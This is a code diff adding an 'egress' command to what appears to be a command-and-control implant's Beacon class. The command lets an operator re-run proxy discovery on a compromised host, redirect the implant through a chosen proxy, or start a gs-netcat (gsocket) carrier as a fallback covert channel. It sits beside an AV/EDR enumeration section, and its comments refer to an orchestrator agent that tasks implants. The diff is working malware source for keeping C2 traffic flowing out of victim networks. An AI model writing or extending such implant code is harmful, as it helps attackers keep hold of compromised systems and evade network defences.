@@ -8391,6 +8391,230 @@ class Beacon:
                 lines.append(f"  {scheme}: {url}")
         return "\n".join(lines)
 
+    # ── Getting out ──
+    #
+    # Three sub-verbs under one tasking key, and with them the thing an
+    # implant could not do at all until now: change how it talks. The
+    # orchestrator's own tool states the limit this closes --
+    # `software/agent/tools/egress.py` says "the implant has no command
+    # that changes its proxy or its transport" -- so a team server looking
+    # at a stuck beacon's rescue record had a diagnosis and two possible
+    # answers, both about timing.
+    #
+    #   egress rediscover         run ProxyDiscovery again, report the list
+    #   egress proxy <index|url>  make one of those candidates the active one
+    #   egress gsocket            bring the carrier up now
+    #
+    # **None of them tests the result, and each says so.** A verb that
+    # posted a probe of its own would be a second request out of a host
+    # where nothing is getting out, at a moment when the reason is not yet
+    # known -- and the operator's next check-in is that probe anyway. So
+    # each answer says what was changed and leaves "and did it work" to
+    # the leg, which reports a failure as a leg failure. The two readings
+    # are the point: "I changed which proxy this implant uses" and "it
+    # still cannot get out" are different things to be told, and a verb
+    # that answered "proxy working" would collapse them.
+
+    def _exec_egress(self, args: str) -> str:
+        """Change how this implant gets out, or say why nothing changed."""
+        parts = (args or "").strip().split(None, 1)
+        action = parts[0].lower() if parts else ""
+        target = parts[1].strip() if len(parts) > 1 else ""
+        if action == "rediscover":
+            return self._egress_rediscover()
+        if action == "proxy":
+            return self._egress_select_proxy(target)
+        if action == "gsocket":
+            return self._egress_gsocket()
+        # The three forms in full rather than the bare words, as
+        # `_exec_tunnel` names both of its own: an operator who typed
+        # `egress transport smb` needs to read what does exist, and the
+        # likeliest wrong guesses are verbs the beacon really has under
+        # other keys.
+        return ("[error] Unknown egress action %r: it is 'egress "
+                "rediscover', 'egress proxy <index|url>' or 'egress "
+                "gsocket'" % action)
+
+    def _proxy_prohibited(self) -> bool:
+        """Whether this build was told to connect directly and not to proxy.
+
+        The same setting `_init_proxy` reads, read the same way: at
+        `mode: none` that method turns `trust_env` off and logs "Proxy:
+        disabled (direct connection)". That is a deliberate statement
+        about how this implant talks, made by whoever generated the build,
+        and an implant that then selected a proxy for itself would
+        contradict an explicit instruction with nobody watching.
+
+        Consulted by both proxy sub-verbs before anything else, so the
+        prohibition binds **tasking** and not only something deciding on
+        the implant's behalf: a gate that lived in a decider would leave
+        the same change reachable from a queued task.
+        """
+        return self.proxy_mode == "none"
+
+    def _proxy_prohibition(self, asked: str) -> str:
+        """The refusal, naming the mode that refuses and what was asked for."""
+        return ("[error] Not %s: this build's c2.proxy.mode is %r, which is "
+                "an instruction to connect directly rather than an absence "
+                "of one. Nothing was changed." % (asked, self.proxy_mode))
+
+    def _egress_rediscover(self) -> str:
+        """Run discovery again and report the list, as `proxyinfo` reports it.
+
+        `discover_all` clears its own list on every call, so this is what
+        makes a candidate list current. Nothing asks again after
+        `_init_proxy`: a proxy that appeared on the host since then -- a
+        `px` the operator just launched through another channel, an
+        environment variable a login script set -- is invisible to a
+        beacon that has been running for a week.
+        """
+        if self._proxy_prohibited():
+            return self._proxy_prohibition("re-running proxy discovery")
+        found = self._proxy.discover_all()
+        # Reported through `summary()`, which is also what `proxyinfo`
+        # prints and what numbers the candidates. The numbering is the
+        # argument `egress proxy` takes, so there is one list and one way
+        # of printing it rather than two that can drift by one.
+        return ("Proxy discovery re-run: %d candidate(s)\n%s"
+                % (len(found), self._proxy.summary()))
+
+    def _egress_select_proxy(self, target: str) -> str:
+        """Make a discovered proxy the active one, by its index or its URL.
+
+        A URL is matched against what discovery found and refused when it
+        is not there. An arbitrary proxy URL from tasking is the nicer
+        operator affordance and the worse one for anything deciding on its
+        own, and one verb cannot have two gates -- so this verb's gate is
+        the discovered list, and the list is the only thing it selects
+        from.
+        """
+        # Nothing but reading the argument happens before the gate: the
+        # prohibition is consulted first so that it cannot be reached
+        # around, and normalising the string here is what lets its refusal
+        # name the value it was given rather than a `None` from a caller
+        # that is not the dispatcher.
+        target = (target or "").strip()
+        if self._proxy_prohibited():
+            return self._proxy_prohibition(
+                "selecting %r as this implant's proxy" % target)
+        if not target:
+            return ("[error] 'egress proxy' takes an index or a URL from the "
+                    "discovered list and was given %r; 'egress rediscover' "
+                    "prints that list with its numbering" % target)
+
+        # The last discovery, not a fresh one: an index an operator read
+        # out of `rediscover` has to still mean the same candidate when
+        # they send it, and a discovery in between can add or drop an
+        # entry. A beacon that has never run one is the exception --
+        # `_init_proxy` skips discovery at `mode: manual` and when an NTLM
+        # relay came up -- because a refusal there would be a refusal for
+        # a reason the operator cannot see.
+        candidates = self._proxy.proxies
+        discovered_now = False
+        if not candidates:
+            candidates = self._proxy.discover_all()
+            discovered_now = True
+        if not candidates:
+            return ("[error] Nothing to select %r from: discovery found no "
+                    "proxy on this host" % target)
+
+        chosen = None
+        if target.isdigit():
+            index = int(target)
+            if not 1 <= index <= len(candidates):
+                return ("[error] There is no discovered proxy %s: the list "
+                        "holds %d, numbered 1 to %d. 'egress rediscover' "
+                        "prints it." % (target, len(candidates),
+                                        len(candidates)))
+            chosen = candidates[index - 1]
+        else:
+            for candidate in candidates:
+                if candidate.get("url") == target:
+                    chosen = candidate
+                    break
+            if chosen is None:
+                return ("[error] %r is not a proxy discovery found on this "
+                        "host, and this verb selects only from that list. "
+                        "What it holds:\n%s"
+                        % (target, self._proxy.summary()))
+
+        if chosen.get("is_pac"):
+            # Refused for the reason `_init_proxy` filters these out
+            # before it selects: a PAC file is a script that names
+            # proxies, not a proxy. urllib takes `http://host/wpad.dat`
+            # apart into a proxy host of `host/wpad.dat`, so the selection
+            # would read as done and no request would ever leave -- the
+            # one outcome this verb must not produce, since its whole
+            # value is that an operator can tell what changed.
+            return ("[error] %s is a PAC URL (%s), which names proxies "
+                    "rather than being one, and nothing here can read it; "
+                    "it cannot be selected"
+                    % (chosen.get("url", target), chosen.get("source", "?")))
+
+        # Written directly, as `_system_info` already reads it directly:
+        # `ProxyDiscovery` sets this field from `select_working` and has no
+        # setter, and a second way to spell "this is the active proxy"
+        # would be a second thing to keep in step.
+        self._proxy._active_proxy = chosen
+        # A new session rather than the old one's `proxies` rewritten.
+        # `_https_post` reads `_proxy_session` once into a local, so
+        # swapping the object cannot change an opener a request is in the
+        # middle of building; and the session being replaced carries a
+        # cookie jar from a path that was not working.
+        #
+        # It replaces whatever the session held, including an NTLM relay's
+        # local listener: on a build with `proxy.ntlm.enabled` the session
+        # posts through `_NtlmProxyRelay`, and a selection here aims it at
+        # an upstream proxy directly, which will very likely answer 407.
+        # The verb honours the instruction it was given rather than
+        # second-guessing it, and `proxyinfo` still reports the relay,
+        # which is where an operator sees what they did.
+        session = _HttpSession()
+        self._proxy_session = session
+        session.proxies = self._proxy.get_urllib_proxies() or {}
+        return ("Proxy selected: %s (%s)%s. Not a test of it: the next "
+                "check-in through it is, and a leg that still fails reports "
+                "as that leg failing"
+                % (chosen.get("url", target), chosen.get("source", "?"),
+                   ", discovered just now" if discovered_now else ""))
+
+    def _egress_gsocket(self) -> str:
+        """Bring the carrier up now, instead of waiting for the latch.
+
+        Through `_gsocket_start` and nothing else: it is idempotent, it
+        holds the restart delay and the latched binary problem, and a
+        second place in this process that spawned a `gs-netcat` is exactly
+        what `carrier.py` and `supervisor.py` each say about themselves
+        not to be.
+        """
+        if not self.gsocket_enabled:
+            # Answered here rather than by `_gsocket_start`, which returns
+            # False for this case and three others. A build generated
+            # before this leg existed, or one that ships it disabled, is
+            # by far the likeliest reason an operator gets a refusal from
+            # this verb, and "the carrier did not start" is not something
+            # they can act on.
+            return ("[error] This build has no gsocket leg to start: "
+                    "gsocket_enabled is %r, so there is no carrier and "
+                    "nothing was changed" % self.gsocket_enabled)
+        running = self._gsocket_proc
+        already = running is not None and running.poll() is None
+        if not self._gsocket_start():
+            return ("[error] The carrier did not start: %s"
+                    % (self._gsocket_problem
+                       or "nothing was latched, so it is the %ds restart "
+                          "delay since the last start, or this host "
+                          "refusing another process"
+                          % self.gsocket_restart_delay_seconds))
+        proc = self._gsocket_proc
+        pid = proc.pid if proc is not None else 0
+        if already:
+            return ("Carrier already up: pid %d, forward on 127.0.0.1:%d"
+                    % (pid, self.gsocket_local_port))
+        return ("Carrier started: pid %d, forward on 127.0.0.1:%d. Not a "
+                "test of the leg: the next check-in through the forward is"
+                % (pid, self.gsocket_local_port))
+
     # ── AV / EDR enumeration ──
 
     _AV_SERVICES_WIN = [
@@ -9193,6 +9417,11 @@ class Beacon:
 
             elif cmd == "proxyinfo":
                 output = self._exec_proxyinfo()
+
+            elif cmd == "egress":
+                # Beside `proxyinfo`, which is the verb that reports what
+                # this one changes.
+                output = self._exec_egress(args)
 
             elif cmd == "avenum":
                 output = self._exec_avenum()
